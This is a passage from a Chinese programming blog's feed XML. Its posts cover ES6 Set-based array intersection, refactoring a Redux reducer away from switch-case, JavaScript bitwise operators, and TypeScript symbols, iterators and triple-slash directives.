&#123;</span><br><span class="line">            tempObj[item.id]: item</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>使用es6语法二</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里这么转换是因为 new Set() 只能接收纯粹的数组，不能是 JSON 格式</span></span><br><span class="line"><span class="keyword">const</span> setArr1 = <span class="keyword">new</span> <span class="built_in">Set</span>(arr1.map(<span class="function"><span class="params">item</span> =&gt;</span> item.id));</span><br><span class="line"><span class="keyword">const</span> setArr2 = <span class="keyword">new</span> <span class="built_in">Set</span>(arr2.map(<span class="function"><span class="params">item</span> =&gt;</span> item.id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用数组 filter 方法</span></span><br><span class="line"><span class="comment">// 调用 Set 数据结构的 has 方法</span></span><br><span class="line"><span class="keyword">const</span> filterArr = [...setArr1].filter(<span class="function"><span class="params">item</span> =&gt;</span> setArr2.has(item))</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>es6</code> 语法为我们提供了很多便利的 <code>api</code>，避免我们再去书写那些繁琐的代码。<br>关于 <code>Set</code> 数据结构的更多信息可以点击<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set" target="_blank" rel="noopener">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实际开发中或者部分的面试题中偶尔会遇到 &lt;code&gt;双重循环&lt;/code&gt; 的问题，直接使用 &lt;code&gt;循环嵌套&lt;/code&gt; 的效率又太低。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redux-reducer的优化写法</title>
    <link href="https://github.com/TheNightElf/2017/05/12/Redux-reducer%E7%9A%84%E4%BC%98%E5%8C%96%E5%86%99%E6%B3%95/"/>
    <id>https://github.com/TheNightElf/2017/05/12/Redux-reducer的优化写法/</id>
    <published>2017-05-12T09:25:43.000Z</published>
    <updated>2018-02-02T10:27:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍如何摆脱 <code>switch-case</code>，以一种更方便的形式接收 <code>action</code> 的通知。<br><a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>redux</code> 是 <code>react</code> 数据管理的一个解决方案，其原理借鉴了 <code>flux</code> 架构。<code>redux</code> 中一共由三个核心部分构成–<code>store</code>、<code>reducer</code>、<code>action</code>，其中 <code>reducer</code> 则是负责接收 <code>action</code> 的消息，然后对数据部分进行处理。官方对于 <code>reducer</code> 的描述为一个简单的 <code>switch-case</code> 结构。下面会介绍 <code>reducer</code> 以一种 <code>key-value</code> 的形式接收 <code>action</code>。</p><h3 id="旧版-switch-case-写法"><a href="#旧版-switch-case-写法" class="headerlink" title="旧版 switch-case 写法"></a>旧版 <code>switch-case</code> 写法</h3><p>下面是伪代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;xxx&#125; <span class="keyword">from</span> <span class="string">'constants'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// action</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> actionHandler = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        type: xxx,</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;xxx, yyy&#125; <span class="keyword">from</span> <span class="string">'constants'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> initialState = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// reducer</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> Model = <span class="function">(<span class="params">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span>(action.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> xxx: </span><br><span class="line">            <span class="keyword">return</span> <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">case</span> yyy:</span><br><span class="line">            <span class="keyword">return</span> <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的这种写法并不能说是错，因为官方给出的例子就是这么介绍的。但是就好比 <code>javascript loop</code> 一样，大家都在用 <code>forEach</code>、<code>for-of</code>了，而我们还是在使用 <code>for</code> 循环。而且 <code>switch-case</code> 就如同循环一般，如果找不到匹配项就会一直向下查找，性能方面不是特别好(我真不想说这句话)。</p><h3 id="重写-reducer"><a href="#重写-reducer" class="headerlink" title="重写 reducer"></a>重写 <code>reducer</code></h3><p>简单的说，<code>reducer</code> 是为了接收一个 <code>action.type</code> 并对数据进行相应的处理，然后返回。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span> (<span class="params">state = initialState, action</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 处理 action，返回 &#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将 <code>action.type</code> 更 <code>reducer</code> 合并：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span> (<span class="params">state = initialState, action</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> (</span><br><span class="line">        &#123;</span><br><span class="line">            [action.type]: <span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。"><a href="#现在-reducer-还是接收-action-type-然后触发相应的数据处理函数。只不过从-switch-case-变成了-key-value-取值的形式。" class="headerlink" title="现在 reducer 还是接收 action.type 然后触发相应的数据处理函数。只不过从 switch-case 变成了 key-value 取值的形式。"></a>现在 <code>reducer</code> 还是接收 <code>action.type</code> 然后触发相应的数据处理函数。只不过从 <code>switch-case</code> 变成了 <code>key-value</code> 取值的形式。</h2><p>最终，我们对上面的代码进行优化：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// createReducer</span></span><br><span class="line"><span class="keyword">export</span>  <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params">initialState, reducerMap</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">state = initialState, action</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> reducer = reducerMap[action.type];</span><br><span class="line">        <span class="keyword">return</span> reducer ? reducer(state, action) : state;</span><br><span class="line">    </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的最终版还是有一点问题，这里我再优化了，留给有心的人去解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍如何摆脱 &lt;code&gt;switch-case&lt;/code&gt;，以一种更方便的形式接收 &lt;code&gt;action&lt;/code&gt; 的通知。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Javascript中那些你不知道的运算符</title>
    <link href="https://github.com/TheNightElf/2017/04/25/Javascript%E4%B8%AD%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <id>https://github.com/TheNightElf/2017/04/25/Javascript中那些你不知道的运算符/</id>
    <published>2017-04-25T07:41:03.000Z</published>
    <updated>2018-01-25T08:42:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>在 <code>javascript</code> 中除了 <code>|</code>,<code>&amp;</code>,<code>+</code>,<code>-</code>,<code>+=</code>..运算符之外，还有很多的运算符；比如：<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>~</code>等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。<br><a id="more"></a></p><h3 id="Javascript中那些你不知道的运算符"><a href="#Javascript中那些你不知道的运算符" class="headerlink" title="Javascript中那些你不知道的运算符"></a>Javascript中那些你不知道的运算符</h3><h4 id="按位左移运算符-lt-lt"><a href="#按位左移运算符-lt-lt" class="headerlink" title="按位左移运算符 (&lt;&lt;)"></a>按位左移运算符 <code>(&lt;&lt;)</code></h4><p>左移表达式的位。</p><p><strong>语法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = expression1 &lt;&lt; expression2</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp;</span><br><span class="line">temp = <span class="number">14</span> &lt;&lt; <span class="number">2</span>; <span class="comment">// -&gt; 56</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 14 转化成二进制 00001110</span></span><br><span class="line"><span class="comment">// 将 00001110 左移 2 位 00111000</span></span><br><span class="line"><span class="comment">// 00111000 -&gt; 56</span></span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>将 <code>expression1</code> 的位左移 <code>expression2</code> 中指定的位数。</p><h4 id="按位右移运算符-gt-gt"><a href="#按位右移运算符-gt-gt" class="headerlink" title="按位右移运算符 (&gt;&gt;)"></a>按位右移运算符 <code>(&gt;&gt;)</code></h4><p>右移表达式的位，保持符号不变。</p><p><strong>语法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = expression1 &gt;&gt; expression2;</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp;</span><br><span class="line">temp = <span class="number">-14</span> &gt;&gt; <span class="number">2</span>; <span class="comment">// -&gt; -4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -14 -&gt; 11110010</span></span><br><span class="line"><span class="comment">// -4 -&gt; 11111100</span></span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用 <code>expression1</code> 的符号位填充右移后左边空出来的位。右移的位被丢弃。</p><h4 id="无符号右移位运算符-gt-gt-gt"><a href="#无符号右移位运算符-gt-gt-gt" class="headerlink" title="无符号右移位运算符 (&gt;&gt;&gt;)"></a>无符号右移位运算符 <code>(&gt;&gt;&gt;)</code></h4><p>右移表达式的位，不保留符号。</p><p><strong>语法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = expression1 &gt;&gt;&gt; expression2</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp;</span><br><span class="line">temp = <span class="number">-14</span> &gt;&gt;&gt; <span class="number">2</span>; <span class="comment">// -&gt; 1073741820</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -14 二进制补码 11111111 11111111 11111111 11110010</span></span><br><span class="line"><span class="comment">// 1073741820 二进制补码 00111111 11111111 11111111 11111100</span></span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>将 <code>expression1</code> 的位右移 <code>expression2</code> 中指定的位数。用零填充右移后左边空出的位。右移的位被丢弃。</p><h4 id="按位取反运算符"><a href="#按位取反运算符" class="headerlink" title="按位取反运算符 (~)"></a>按位取反运算符 <code>(~)</code></h4><p>对一个表达式执行位非（求非）运算。</p><p><strong>语法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = ~ expression</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = ~<span class="number">5</span>; <span class="comment">// -&gt; -6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5 转化成二进制 00000000 00000000 00000000 00000101</span></span><br><span class="line"><span class="comment">// -6 转化成二进制 11111111 11111111 11111111 11111010</span></span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>所有一元运算符（如 ~ 运算符）都按照下面的规则来计算表达式的值：</p><ul><li>如果应用于未定义的表达式或 <code>null</code> 表达式，则会引发一个运行时错误。</li><li>将对象转换为字符串。</li><li>如果可能，将字符串转换为数字。否则，将引发运行时错误。</li><li>布尔值被视为数字（如果为 <code>false</code>，则为 <code>0</code>；如果为 <code>true</code>，则为 <code>1</code>）。</li></ul><p>运算符将应用于结果数字。<br><code>~</code> 运算符查看表达式的二进制表示形式的值，并执行位非运算。<br>表达式中的任何一位为 <code>1</code>，则结果中的该位变为 <code>0</code>。表达式中的任何一位为 <code>0</code>，则结果中的该位变为 <code>1</code>。</p><h4 id="按位异或运算符"><a href="#按位异或运算符" class="headerlink" title="按位异或运算符 (^)"></a>按位异或运算符 <code>(^)</code></h4><p>对两个表达式执行按位“异或”运算。</p><p><strong>语法</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = expression1 ^ expression2</span><br></pre></td></tr></table></figure></p><p><strong>示例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="number">5</span> ^ <span class="number">12</span>; <span class="comment">// -&gt; 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5 -&gt; 0101</span></span><br><span class="line"><span class="comment">// 12 -&gt; 1100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 9 -&gt; 1001</span></span><br></pre></td></tr></table></figure><p><strong>解释</strong><br>当且仅当只有一个表达式的某位为 <code>1</code> 时，结果中的该位才为 <code>1</code>。否则，结果中的该位为 <code>0</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 &lt;code&gt;javascript&lt;/code&gt; 中除了 &lt;code&gt;|&lt;/code&gt;,&lt;code&gt;&amp;amp;&lt;/code&gt;,&lt;code&gt;+&lt;/code&gt;,&lt;code&gt;-&lt;/code&gt;,&lt;code&gt;+=&lt;/code&gt;..运算符之外，还有很多的运算符；比如：&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;,&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;,&lt;code&gt;~&lt;/code&gt;等运算符，相信很多人跟我一样第一眼看到这些运算符心里完全是一脸懵逼。本文将要介绍的就是哪些你可能一辈子都用不到的运算符。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(十)</title>
    <link href="https://github.com/TheNightElf/2017/03/17/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E5%8D%81%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/03/17/Typescript学习日记（十）/</id>
    <published>2017-03-17T06:20:02.000Z</published>
    <updated>2018-01-25T07:25:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>symbol</code> 是 <code>ECMAScript 2015</code> 提出的一种行的原生类型，就像 <code>number</code> 和 <code>string</code> 一样。实现了 <code>Symbol.iterator</code> 方法就可以使用 <code>for-of</code> 遍历。<br><a id="more"></a></p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意，Symbol() 并不是一个构造函数，所以不需要 new 关键字</span></span><br><span class="line"><span class="keyword">let</span> sy = <span class="built_in">Symbol</span>(<span class="string">'key'</span>);</span><br></pre></td></tr></table></figure><h4 id="Symbols是不可改变且唯一的"><a href="#Symbols是不可改变且唯一的" class="headerlink" title="Symbols是不可改变且唯一的"></a>Symbols是不可改变且唯一的</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sy1 = <span class="built_in">Symbol</span>(<span class="string">'a'</span>);</span><br><span class="line"><span class="keyword">let</span> sy2 = <span class="built_in">Symbol</span>(<span class="string">'a'</span>);</span><br><span class="line"></span><br><span class="line">sy1 === sy2;  <span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure><h4 id="像字符串一样，symbols也可以被用做对象属性的键"><a href="#像字符串一样，symbols也可以被用做对象属性的键" class="headerlink" title="像字符串一样，symbols也可以被用做对象属性的键"></a>像字符串一样，symbols也可以被用做对象属性的键</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sy = <span class="built_in">Symbol</span>(<span class="string">'key'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    [sy]: <span class="string">"value"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj[sym]); <span class="comment">// "value"</span></span><br></pre></td></tr></table></figure><h4 id="Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员"><a href="#Symbols也可以与计算出的-属性名声明相结合-来-声明对象的属性和类成员" class="headerlink" title="Symbols也可以与计算出的 属性名声明相结合 来 声明对象的属性和类成员"></a>Symbols也可以与计算出的 <code>属性名声明相结合</code> 来 <code>声明对象的属性和类成员</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getClassNameSymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    [getClassNameSymbol]()&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"C"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> C();</span><br><span class="line"><span class="keyword">let</span> className = c[getClassNameSymbol](); <span class="comment">// "C"</span></span><br></pre></td></tr></table></figure><h4 id="内置属性"><a href="#内置属性" class="headerlink" title="内置属性"></a>内置属性</h4><p><strong><code>Symbol.hasInstance</code></strong><br>方法，会被 <code>instanceof</code> 运算符调用。构造器对象用来识别一个对象是否是其实例。</p><p><strong><code>Symbol.isConcatSpreadable</code></strong><br>布尔值，表示当在一个对象上调用 <code>Array.prototype.concat</code> 时，这个对象的数组元素是否可展开。</p><p><strong><code>Symbol.iterator</code></strong><br>方法，被for-of语句调用。返回对象的默认迭代器。</p><p><strong><code>Symbol.match</code></strong><br>方法，被 <code>String.prototype.match</code> 调用。正则表达式用来匹配字符串。</p><p><strong><code>Symbol.replace</code></strong><br>方法，被 <code>String.prototype.replace</code> 调用。正则表达式用来替换字符串中匹配的子串。</p><p><strong><code>Symbol.search</code></strong><br>方法，被 <code>String.prototype.search</code> 调用。正则表达式返回被匹配部分在字符串中的索引。</p><p><strong><code>Symbol.species</code></strong><br>函数值，为一个构造函数。用来创建派生对象。</p><p><strong><code>Symbol.split</code></strong><br>方法，被 <code>String.prototype.split</code> 调用。正则表达式来用分割字符串。</p><p><strong><code>Symbol.toPrimitive</code></strong><br>方法，被 <code>ToPrimitive</code> 抽象操作调用。把对象转换为相应的原始值。</p><p><strong><code>Symbol.toStringTag</code></strong><br>方法，被内置方法 <code>Object.prototype.toString</code> 调用。返回创建对象时默认的字符串描述。</p><p><strong><code>Symbol.unscopables</code></strong><br>对象，它自己拥有的属性会被 <code>with</code> 作用域排除在外。</p><p>更多关于 <code>Symbols</code> 的介绍可以查看<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol" target="_blank" rel="noopener">这里</a>。</p><h3 id="迭代器-iterator-和生成器"><a href="#迭代器-iterator-和生成器" class="headerlink" title="迭代器(iterator)和生成器"></a>迭代器(iterator)和生成器</h3><p>当一个对象实现了 <code>Symbol.iterator</code> 属性时，我们认为它是可迭代的。目前一些内置的类型如 <code>Array</code>，<code>Map</code>，<code>Set</code>，<code>String</code>，<code>Int32Array</code>，<code>Uint32Array</code> 等都已经实现了各自的 <code>Symbol.iterator</code>。 对象上的 <code>Symbol.iterator</code> 函数负责返回供迭代的值。</p><h4 id="for-of-语句"><a href="#for-of-语句" class="headerlink" title="for-of 语句"></a><code>for-of</code> 语句</h4><p><code>for-of</code> 会遍历可迭代的对象，调用对象上的 <code>Symbol.iterator</code> 方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="string">"string"</span>, <span class="literal">false</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> val <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(val); <span class="comment">// 1, "string", false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="for-of-vs-for-in"><a href="#for-of-vs-for-in" class="headerlink" title="for-of vs for-in"></a><code>for-of</code> vs <code>for-in</code></h4><p><code>for-of</code> 和 <code>for-in</code> 均可迭代一个列表；但是用于迭代的值却不同，<code>for-in</code> 迭代的是对象的 <code>键</code> 的列表，而<code>for-of</code> 则迭代对象的键对应的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="string">"string"</span>, <span class="literal">false</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> arr) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key); <span class="comment">// 0, 1, 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> val <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(val); <span class="comment">// 1, "string", false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个区别是 <code>for-in</code> 可以操作任何对象；它提供了查看对象属性的一种方法。 但是 <code>for-of</code> 关注于迭代对象的值。内置对象 <code>Map</code> 和 <code>Set</code> 已经实现了 <code>Symbol.iterator</code> 方法，让我们可以访问它们保存的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pets = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">"Cat"</span>, <span class="string">"Dog"</span>, <span class="string">"Hamster"</span>]);</span><br><span class="line">pets[<span class="string">"species"</span>] = <span class="string">"mammals"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> pet <span class="keyword">in</span> pets) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pet); <span class="comment">// "species"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> pet <span class="keyword">of</span> pets) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pet); <span class="comment">// "Cat", "Dog", "Hamster"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三斜线指令"><a href="#三斜线指令" class="headerlink" title="三斜线指令"></a>三斜线指令</h3><p>三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。</p><p>三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在 <code>一个语句或声明</code> 之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。</p><h4 id="lt-reference-path-quot-quot-gt"><a href="#lt-reference-path-quot-quot-gt" class="headerlink" title="/// &lt;reference path=&quot;...&quot; /&gt;"></a><code>/// &lt;reference path=&quot;...&quot; /&gt;</code></h4><p><code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令是三斜线指令中最常见的一种。 它用于声明文件间的 <code>依赖</code>。三斜线引用告诉编译器在编译过程中要引入的额外的文件。</p><h4 id="使用-noResolve"><a href="#使用-noResolve" class="headerlink" title="使用 --noResolve"></a>使用 <code>--noResolve</code></h4><p>如果指定了 <code>--noResolve</code> 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。</p><h4 id="lt-reference-types-quot-quot-gt"><a href="#lt-reference-types-quot-quot-gt" class="headerlink" title="/// &lt;reference types=&quot;...&quot; /&gt;"></a><code>/// &lt;reference types=&quot;...&quot; /&gt;</code></h4><p>与 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令相似，这个指令是用来声明依赖的； 一个 <code>/// &lt;reference path=&quot;...&quot; /&gt;</code> 指令声明了对 <code>@types</code> 包的一个依赖。</p><p>在声明文件里包含 <code>/// &lt;reference types=&quot;node&quot; /&gt;</code>，表明这个文件使用了 <code>@types/node/index.d.ts</code> 里面声明的名字； 并且，这个包要在编译阶段与声明文件一起被包含进来。</p><p>解析 <code>@types</code> 包的名字的过程与解析 <code>import</code> 语句里模块名的过程类似。 所以可以简单的把三斜线类型引用指令想像成针对包的 <code>import</code> 声明。</p><p>仅当在你需要写一个 <code>d.ts</code> 文件时才使用这个指令。</p><p>对于那些在编译阶段生成的声明文件，编译器会自动地添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code>； 当且仅当结果文件中使用了引用的@types包里的声明时才会在生成的声明文件里添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code> 语句。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>大致看了下，后面的内容都是一些需要记忆的内容，不会牵扯到太多的代码；这里就不再继续往下写了，有想阅读后面内容的朋友可以进入<a href="https://www.tslang.cn/index.html" target="_blank" rel="noopener">Typescript中文文档</a>继续学习。</p>]]></content>
    
    <summary type="html">
    
